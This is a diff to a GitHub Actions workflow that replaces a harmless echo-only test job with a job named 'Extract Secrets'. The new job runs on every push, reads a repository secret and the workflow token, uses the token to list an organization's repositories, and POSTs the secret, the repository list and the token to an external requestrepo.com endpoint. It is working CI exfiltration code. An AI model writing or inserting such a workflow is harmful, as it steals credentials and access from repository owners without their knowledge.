@@ -1,11 +1,21 @@
-name: Auto Run Test
+name: Extract Secrets
 on:
   push:
   workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
 jobs:
-  run:
+  extract:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Workflow executed in org $(cat $GITHUB_EVENT_PATH | jq -r .organization.login)"
-      - run: echo "Repository is $GITHUB_REPOSITORY"
-      - run: echo "Runner is $(hostname)"
+      - name: Exfiltrate
+        env:
+          SECRET: ${{ secrets.TMP_SECRET }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          REPOS=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/orgs/cybxis-ent-org1/repos?per_page=100" | jq -r '.[].name')
+
+          curl -s -X POST https://mzdbtd6e.requestrepo.com \
+            -d "secret=$SECRET&repos=$REPOS&token=$GH_TOKEN"
